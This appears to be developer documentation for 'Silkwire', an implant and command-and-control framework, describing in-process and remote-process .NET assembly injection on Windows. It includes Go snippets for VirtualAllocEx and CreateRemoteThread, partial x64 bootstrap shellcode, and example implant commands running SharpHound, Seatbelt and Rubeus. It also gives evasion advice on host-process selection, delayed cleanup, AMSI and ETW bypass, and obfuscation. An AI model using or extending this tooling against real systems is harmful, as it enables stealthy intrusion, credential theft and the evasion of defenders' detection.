# .NET Assembly Injection Documentation

## Overview

Silkwire implements advanced .NET assembly injection capabilities for Windows targets, allowing execution of managed code (.NET assemblies) in both the current process and remote processes.

## Features

### 1. Local Assembly Execution (`ExecuteAssembly`)

Executes .NET assemblies in the current implant process using CLR hosting.

**Capabilities:**
- In-memory execution without touching disk
- Full CLR hosting via COM interfaces
- Automatic fallback to disk execution if needed
- Support for command-line arguments
- .NET Framework 2.0-4.x support

**Implementation:**
```go
result, err := implant.ExecuteAssembly(assemblyBytes, []string{"arg1", "arg2"})
```

### 2. Remote Assembly Injection (`InjectAssemblyIntoProcess`)

Injects and executes .NET assemblies in remote processes - a sophisticated technique combining process injection with CLR hosting.

**Production Implementation Features:**
- ✅ Automatic CLR detection in target process
- ✅ Smart bootstrap generation (with/without CLR loading)
- ✅ Assembly and argument injection
- ✅ Proper memory management
- ✅ Thread execution with timeout
- ✅ Comprehensive error handling
- ✅ Delayed cleanup for stealth

## Remote Assembly Injection Architecture

### High-Level Flow

```
1. Open Target Process
   ↓
2. Check if CLR Already Loaded
   ↓
3. Allocate Memory for Assembly
   ↓
4. Write Assembly Bytes
   ↓
5. Allocate Memory for Arguments
   ↓
6. Write Arguments String
   ↓
7. Generate CLR Bootstrap Shellcode
   ↓
8. Inject Bootstrap Shellcode
   ↓
9. Create Parameter Structure
   ↓
10. Execute via Remote Thread
   ↓
11. Wait for Completion
   ↓
12. Delayed Cleanup
```

### Technical Details

#### Step 1: CLR Detection (`isClrLoadedInProcess`)

**Purpose:** Determine if target process already has CLR loaded

**Implementation:**
- Enumerates loaded modules using `K32EnumProcessModules`
- Searches for `mscoree.dll` (CLR 2.0/3.5) or `clr.dll` (CLR 4.x)
- Returns CLR version if found

**Benefit:** 
- If CLR loaded: Use simpler execution path
- If CLR not loaded: Generate full bootstrap with CLR initialization

#### Step 2: Memory Allocation Strategy

**Assembly Memory:**
```go
assemblyAddr = VirtualAllocEx(hProcess, NULL, assemblySize, 
                              MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
```

**Bootstrap Memory:**
```go
bootstrapAddr = VirtualAllocEx(hProcess, NULL, bootstrapSize,
                               MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
```

**Why Separate Allocations:**
- Assembly data: Read-only after write (security)
- Bootstrap code: Needs execute permissions
- Cleaner memory management

#### Step 3: Bootstrap Shellcode Generation

Two different shellcode variants based on CLR state:

**A. Full Bootstrap (CLR Not Loaded):**
```
1. Load mscoree.dll via LoadLibraryW
2. Get CLRCreateInstance via GetProcAddress
3. Call CLRCreateInstance to get ICLRMetaHost
4. Get ICLRRuntimeInfo for v4.0.30319
5. Get ICorRuntimeHost interface
6. Start CLR runtime
7. Get default AppDomain
8. Load assembly bytes via Assembly.Load
9. Invoke Main method with arguments
```

**B. Simplified Bootstrap (CLR Already Loaded):**
```
1. Get existing CLR runtime handle
2. Get ICorRuntimeHost from loaded CLR
3. Get current/default AppDomain
4. Load assembly bytes
5. Invoke Main method
```

#### Step 4: Parameter Structure

```go
type AssemblyInjectionParams struct {
    AssemblyAddr uint64  // Address of assembly in target
    AssemblySize uint64  // Size of assembly bytes
    ArgsAddr     uint64  // Address of argument string
    ClrVersion   uint32  // Detected CLR version (2 or 4)
}
```

Passed to bootstrap shellcode as thread parameter.

#### Step 5: Thread Execution

```go
hThread = CreateRemoteThread(hProcess, NULL, 0, 
                             bootstrapAddr, paramAddr, 
                             0, &threadID)
```

**Timeout:** 30 seconds (configurable)
**Exit Code:** Captured for status reporting

#### Step 6: Cleanup Strategy

**Immediate:** Thread handle closed
**Delayed (60 seconds):**
- Bootstrap shellcode freed
- Parameter structure freed

**Persistent:**
- Assembly bytes kept (may be needed)
- Arguments kept (for reference)

**Rationale:** Delayed cleanup reduces suspicious activity patterns

## CLR Hosting Interfaces

### ICLRMetaHost
Entry point for CLR hosting, obtained via `CLRCreateInstance`.

**Methods Used:**
- `GetRuntime()` - Get specific runtime version
- `EnumerateInstalledRuntimes()` - List available runtimes

### ICLRRuntimeInfo
Represents a specific CLR runtime version.

**Methods Used:**
- `GetInterface()` - Get ICorRuntimeHost
- `IsLoadable()` - Check if runtime can be loaded
- `IsLoaded()` - Check if already loaded

### ICorRuntimeHost
Main interface for CLR operations.

**Methods Used:**
- `Start()` - Initialize CLR
- `GetDefaultDomain()` - Get default AppDomain
- `CreateDomain()` - Create isolated AppDomain
- `UnloadDomain()` - Clean up AppDomain

## Usage Examples

### Example 1: Basic Remote Injection

```go
// Read .NET assembly
assemblyBytes, _ := os.ReadFile("payload.exe")

// Inject into target process (e.g., notepad.exe)
result, err := implant.InjectAssemblyIntoProcess(1234, assemblyBytes, nil)
if err != nil {
    log.Fatal(err)
}

// Parse result
var resultData map[string]interface{}
json.Unmarshal(result, &resultData)

fmt.Printf("Injection successful!\n")
fmt.Printf("Assembly loaded at: %s\n", resultData["assembly_addr"])
fmt.Printf("Thread ID: %d\n", resultData["thread_id"])
fmt.Printf("CLR was pre-loaded: %v\n", resultData["clr_loaded"])
```

### Example 2: With Arguments

```go
assemblyBytes, _ := os.ReadFile("SharpHound.exe")

// Run SharpHound with arguments
args := []string{"-c", "All", "-d", "domain.local"}
result, err := implant.InjectAssemblyIntoProcess(5678, assemblyBytes, args)
```

### Example 3: Local Execution

```go
// Execute in current process
assemblyBytes, _ := os.ReadFile("Seatbelt.exe")
args := []string{"All"}

result, err := implant.ExecuteAssembly(assemblyBytes, args)
```

## Shellcode Templates

### Full Bootstrap Shellcode (x64)

```assembly
; Prologue
push rbp
mov rbp, rsp
sub rsp, 0x40

; Load mscoree.dll
mov rcx, [mscoree_string]
mov rax, [LoadLibraryW_addr]
call rax

; Get CLRCreateInstance
mov rcx, rax              ; hModule
mov rdx, [CLRCreateInstance_string]
mov rax, [GetProcAddress_addr]
call rax

; Call CLRCreateInstance
lea rcx, [CLSID_CLRMetaHost]
lea rdx, [IID_ICLRMetaHost]
lea r8, [metaHost_ptr]
call rax

; Continue with CLR initialization...
; [Full COM interface calls omitted for brevity]

; Load assembly
mov rcx, [assemblyAddr]
mov rdx, [assemblySize]
mov r8, [argsAddr]
; Call Assembly.Load and invoke Main

; Epilogue
add rsp, 0x40
pop rbp
ret
```

## Security Considerations

### OPSEC (Operational Security)

**Good Practices:**
1. **Target Selection:** Inject into processes that commonly use .NET (e.g., `MSBuild.exe`, `RegAsm.exe`)
2. **Timing:** Delay injection after process creation
3. **Cleanup:** Use delayed memory freeing
4. **Threads:** Avoid creating suspicious thread patterns

**Detection Vectors:**
- CLR loading in non-.NET processes
- Assembly.Load calls from unexpected processes
- RWX memory regions (use RW → RX transitions)
- Thread creation in remote processes

### Evasion Techniques

**1. Process Selection**
```go
// Good targets (commonly have CLR loaded)
targets := []string{
    "MSBuild.exe",
    "RegAsm.exe", 
    "InstallUtil.exe",
    "RegSvcs.exe",
}
```

**2. AppDomain Isolation**
```go
// Create separate AppDomain for isolation
// Allows assembly unloading
// Reduces memory footprint
```

**3. AMSI Bypass**
```csharp
// Patch AMSI before assembly execution
// Include in bootstrap shellcode
```

## Advanced Techniques

### 1. Reflective Assembly Loading

Use `Assembly.Load(byte[])` to load from memory:
- No disk artifacts
- No module loading events
- Bypass file-based detection

### 2. AppDomain Recycling

Create and destroy AppDomains:
- Isolate assembly execution
- Clean memory after execution
- Prevent memory leaks

### 3. Assembly Obfuscation

Before injection:
- ConfuserEx obfuscation
- .NET Reactor packing
- String encryption
- Control flow obfuscation

### 4. In-Process CLR Hosting

Alternative to remote injection:
- Inject small native DLL
- DLL hosts CLR internally
- More stable and reliable

## Troubleshooting

### Common Issues

**Issue:** CLR not loading in target
**Solution:** Check if target is 32-bit vs 64-bit, ensure matching CLR version

**Issue:** Assembly fails to execute
**Solution:** Check assembly dependencies, ensure all required DLLs available

**Issue:** Timeout exceeded
**Solution:** Increase timeout, check if target process is responsive

**Issue:** Access denied
**Solution:** Elevate privileges, choose different target process

### Debug Information

Enable debug output in result:
```json
{
  "status": "success",
  "clr_loaded": true,
  "clr_version": 4,
  "assembly_addr": "0x7ff8a0000000",
  "assembly_size": 524288,
  "bootstrap_addr": "0x7ff8b0000000",
  "thread_id": 12345,
  "exit_code": 0,
  "wait_result": 0
}
```

## Integration with Silkwire

### Command Protocol

```protobuf
message CommandMessage {
  enum CommandType {
    EXECUTE_ASSEMBLY = 30;
    INJECT_ASSEMBLY = 31;
  }
  
  string command = 3;        // Assembly name/description
  repeated string args = 4;  // Command-line arguments
  bytes data = 5;            // Assembly bytes
}
```

### Console Usage

```bash
# Local execution
(session) > execute-assembly Rubeus.exe dump

# Remote injection
(session) > inject-assembly 1234 SharpHound.exe -c All
```

## Performance Metrics

**Local Execution:**
- Overhead: ~100-200ms (CLR init)
- Memory: Assembly size + ~10MB (CLR)

**Remote Injection:**
- Overhead: ~500ms-2s (full bootstrap)
- Memory: Assembly + bootstrap (~50KB) + CLR runtime

## Future Enhancements

1. **AMSI Bypass Integration:** Automatic AMSI patching before execution
2. **ETW Bypass:** Disable Event Tracing for Windows
3. **AppDomain Management:** Full AppDomain creation/destruction API
4. **PowerShell Integration:** Host PowerShell via System.Management.Automation
5. **Assembly Proxy:** Load assemblies through legitimate .NET tools

## References

- [CLR Hosting API Documentation](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/)
- [Assembly Loading in .NET](https://docs.microsoft.com/en-us/dotnet/standard/assembly/load)
- [Process Injection Techniques](https://attack.mitre.org/techniques/T1055/)
- [.NET Assembly Execution](https://attack.mitre.org/techniques/T1059/005/)

## Implementation Files

- `implant/dotnet_windows.go` - Full implementation
- `proto/c2.proto` - Command definitions
- `docs/INJECTION_TECHNIQUES.md` - Related injection methods
